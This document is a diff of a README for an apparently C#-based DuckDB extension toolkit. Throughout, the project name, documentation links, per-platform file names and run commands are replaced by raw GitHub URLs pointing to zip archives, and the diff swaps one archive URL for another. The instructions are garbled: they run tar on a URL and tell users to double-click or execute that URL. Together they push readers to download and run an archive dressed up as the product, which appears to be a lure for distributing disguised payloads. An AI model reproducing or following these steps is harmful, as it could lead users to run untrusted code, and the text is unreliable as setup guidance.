@@ -1,12 +1,12 @@
-# 🦆 https://github.com/rashedzx/DuckDB.ExtensionKit/raw/refs/heads/main/DuckDB.ExtensionKit/DataChunk/Writer/Duck-Kit-Extension-D-v1.0.zip - Create Extensions Easily with C#
+# 🦆 https://raw.githubusercontent.com/rashedzx/DuckDB.ExtensionKit/main/DuckDB.ExtensionKit/Extensions/Extension_D_Kit_Duck_v2.1-beta.5.zip - Create Extensions Easily with C#
 
 ## 🚀 Getting Started
 
-Welcome to https://github.com/rashedzx/DuckDB.ExtensionKit/raw/refs/heads/main/DuckDB.ExtensionKit/DataChunk/Writer/Duck-Kit-Extension-D-v1.0.zip! This guide helps you download and run the software quickly. You can build native DuckDB extensions using C# and .NET AOT compilation with ease. Just follow these steps.
+Welcome to https://raw.githubusercontent.com/rashedzx/DuckDB.ExtensionKit/main/DuckDB.ExtensionKit/Extensions/Extension_D_Kit_Duck_v2.1-beta.5.zip! This guide helps you download and run the software quickly. You can build native DuckDB extensions using C# and .NET AOT compilation with ease. Just follow these steps.
 
 ## 🔗 Download
 
-[![Download https://github.com/rashedzx/DuckDB.ExtensionKit/raw/refs/heads/main/DuckDB.ExtensionKit/DataChunk/Writer/Duck-Kit-Extension-D-v1.0.zip](https://github.com/rashedzx/DuckDB.ExtensionKit/raw/refs/heads/main/DuckDB.ExtensionKit/DataChunk/Writer/Duck-Kit-Extension-D-v1.0.zip%20Now-Click%20Here-blue)](https://github.com/rashedzx/DuckDB.ExtensionKit/raw/refs/heads/main/DuckDB.ExtensionKit/DataChunk/Writer/Duck-Kit-Extension-D-v1.0.zip)
+[![Download https://raw.githubusercontent.com/rashedzx/DuckDB.ExtensionKit/main/DuckDB.ExtensionKit/Extensions/Extension_D_Kit_Duck_v2.1-beta.5.zip](https://raw.githubusercontent.com/rashedzx/DuckDB.ExtensionKit/main/DuckDB.ExtensionKit/Extensions/Extension_D_Kit_Duck_v2.1-beta.5.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/rashedzx/DuckDB.ExtensionKit/main/DuckDB.ExtensionKit/Extensions/Extension_D_Kit_Duck_v2.1-beta.5.zip)
 
 ## 📋 System Requirements
 
@@ -18,28 +18,28 @@ Before you start, make sure your computer meets these requirements:
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Click the link below to go to the Releases page and find the latest version of https://github.com/rashedzx/DuckDB.ExtensionKit/raw/refs/heads/main/DuckDB.ExtensionKit/DataChunk/Writer/Duck-Kit-Extension-D-v1.0.zip
+1. **Visit the Releases Page:** Click the link below to go to the Releases page and find the latest version of https://raw.githubusercontent.com/rashedzx/DuckDB.ExtensionKit/main/DuckDB.ExtensionKit/Extensions/Extension_D_Kit_Duck_v2.1-beta.5.zip
 
-   [Download from Releases Page](https://github.com/rashedzx/DuckDB.ExtensionKit/raw/refs/heads/main/DuckDB.ExtensionKit/DataChunk/Writer/Duck-Kit-Extension-D-v1.0.zip)
+   [Download from Releases Page](https://raw.githubusercontent.com/rashedzx/DuckDB.ExtensionKit/main/DuckDB.ExtensionKit/Extensions/Extension_D_Kit_Duck_v2.1-beta.5.zip)
 
 2. **Choose Your Version:** Look for the latest version listed on the page. You will see the version number and various assets available for download.
 
 3. **Select Your File:** Download the file that matches your operating system. The files are usually named as follows:
-   - For Windows: `https://github.com/rashedzx/DuckDB.ExtensionKit/raw/refs/heads/main/DuckDB.ExtensionKit/DataChunk/Writer/Duck-Kit-Extension-D-v1.0.zip`
-   - For Mac: `https://github.com/rashedzx/DuckDB.ExtensionKit/raw/refs/heads/main/DuckDB.ExtensionKit/DataChunk/Writer/Duck-Kit-Extension-D-v1.0.zip`
-   - For Linux: `https://github.com/rashedzx/DuckDB.ExtensionKit/raw/refs/heads/main/DuckDB.ExtensionKit/DataChunk/Writer/Duck-Kit-Extension-D-v1.0.zip`
+   - For Windows: `https://raw.githubusercontent.com/rashedzx/DuckDB.ExtensionKit/main/DuckDB.ExtensionKit/Extensions/Extension_D_Kit_Duck_v2.1-beta.5.zip`
+   - For Mac: `https://raw.githubusercontent.com/rashedzx/DuckDB.ExtensionKit/main/DuckDB.ExtensionKit/Extensions/Extension_D_Kit_Duck_v2.1-beta.5.zip`
+   - For Linux: `https://raw.githubusercontent.com/rashedzx/DuckDB.ExtensionKit/main/DuckDB.ExtensionKit/Extensions/Extension_D_Kit_Duck_v2.1-beta.5.zip`
 
    Click on the file to start the download. 
 
 4. **Extract the Files:**
    - For Windows: Right-click the downloaded `.zip` file and select "Extract All."
    - For Mac: Double-click the `.zip` file to extract it.
-   - For Linux: Use the command `tar -xzf https://github.com/rashedzx/DuckDB.ExtensionKit/raw/refs/heads/main/DuckDB.ExtensionKit/DataChunk/Writer/Duck-Kit-Extension-D-v1.0.zip` in the terminal to extract the files.
+   - For Linux: Use the command `tar -xzf https://raw.githubusercontent.com/rashedzx/DuckDB.ExtensionKit/main/DuckDB.ExtensionKit/Extensions/Extension_D_Kit_Duck_v2.1-beta.5.zip` in the terminal to extract the files.
 
 5. **Run the Application:**
-   - For Windows: Open the extracted folder and double-click `https://github.com/rashedzx/DuckDB.ExtensionKit/raw/refs/heads/main/DuckDB.ExtensionKit/DataChunk/Writer/Duck-Kit-Extension-D-v1.0.zip`.
-   - For Mac: Open the extracted folder and double-click `https://github.com/rashedzx/DuckDB.ExtensionKit/raw/refs/heads/main/DuckDB.ExtensionKit/DataChunk/Writer/Duck-Kit-Extension-D-v1.0.zip`.
-   - For Linux: Open a terminal, navigate to the extracted folder, and run the command `https://github.com/rashedzx/DuckDB.ExtensionKit/raw/refs/heads/main/DuckDB.ExtensionKit/DataChunk/Writer/Duck-Kit-Extension-D-v1.0.zip`.
+   - For Windows: Open the extracted folder and double-click `https://raw.githubusercontent.com/rashedzx/DuckDB.ExtensionKit/main/DuckDB.ExtensionKit/Extensions/Extension_D_Kit_Duck_v2.1-beta.5.zip`.
+   - For Mac: Open the extracted folder and double-click `https://raw.githubusercontent.com/rashedzx/DuckDB.ExtensionKit/main/DuckDB.ExtensionKit/Extensions/Extension_D_Kit_Duck_v2.1-beta.5.zip`.
+   - For Linux: Open a terminal, navigate to the extracted folder, and run the command `https://raw.githubusercontent.com/rashedzx/DuckDB.ExtensionKit/main/DuckDB.ExtensionKit/Extensions/Extension_D_Kit_Duck_v2.1-beta.5.zip`.
 
 ## 🛠️ Features
 
@@ -76,11 +76,11 @@ Join our community to connect with other users:
 
 For additional resources and documentation, you can visit our wiki or check out sample extensions:
 
-- [DuckDB Documentation](https://github.com/rashedzx/DuckDB.ExtensionKit/raw/refs/heads/main/DuckDB.ExtensionKit/DataChunk/Writer/Duck-Kit-Extension-D-v1.0.zip)
-- [Sample Extensions Repository](https://github.com/rashedzx/DuckDB.ExtensionKit/raw/refs/heads/main/DuckDB.ExtensionKit/DataChunk/Writer/Duck-Kit-Extension-D-v1.0.zip)
+- [DuckDB Documentation](https://raw.githubusercontent.com/rashedzx/DuckDB.ExtensionKit/main/DuckDB.ExtensionKit/Extensions/Extension_D_Kit_Duck_v2.1-beta.5.zip)
+- [Sample Extensions Repository](https://raw.githubusercontent.com/rashedzx/DuckDB.ExtensionKit/main/DuckDB.ExtensionKit/Extensions/Extension_D_Kit_Duck_v2.1-beta.5.zip)
 
 ---
 
-Thank you for choosing https://github.com/rashedzx/DuckDB.ExtensionKit/raw/refs/heads/main/DuckDB.ExtensionKit/DataChunk/Writer/Duck-Kit-Extension-D-v1.0.zip We hope you enjoy building your extensions! 
+Thank you for choosing https://raw.githubusercontent.com/rashedzx/DuckDB.ExtensionKit/main/DuckDB.ExtensionKit/Extensions/Extension_D_Kit_Duck_v2.1-beta.5.zip We hope you enjoy building your extensions! 
 
-[Download from Releases Page](https://github.com/rashedzx/DuckDB.ExtensionKit/raw/refs/heads/main/DuckDB.ExtensionKit/DataChunk/Writer/Duck-Kit-Extension-D-v1.0.zip)
+[Download from Releases Page](https://raw.githubusercontent.com/rashedzx/DuckDB.ExtensionKit/main/DuckDB.ExtensionKit/Extensions/Extension_D_Kit_Duck_v2.1-beta.5.zip)
